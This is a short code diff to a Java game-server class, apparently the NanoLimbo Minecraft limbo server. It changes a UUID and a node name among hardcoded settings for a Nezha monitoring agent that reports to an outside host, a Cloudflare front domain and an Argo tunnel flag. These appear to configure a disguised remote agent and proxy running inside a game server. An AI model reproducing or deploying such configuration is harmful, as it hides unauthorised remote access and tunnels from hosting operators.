@@ -123,7 +123,7 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "b87d140e-dfa0-4791-943c-8c122325f46e");
+        envVars.put("UUID", "74641c36-eb2c-4932-b922-7f84a7c7466b");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "agent.ejoy.pp.ua:80");
         envVars.put("NEZHA_PORT", "");
@@ -142,7 +142,7 @@ public final class NanoLimbo {
         envVars.put("BOT_TOKEN", "");
         envVars.put("CFIP", "cdns.doon.eu.org");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "hiden-klovekiss-pro");
+        envVars.put("NAME", "freezehost-lilypro");
         envVars.put("DISABLE_ARGO", "false");
         
         for (String var : ALL_ENV_VARS) {
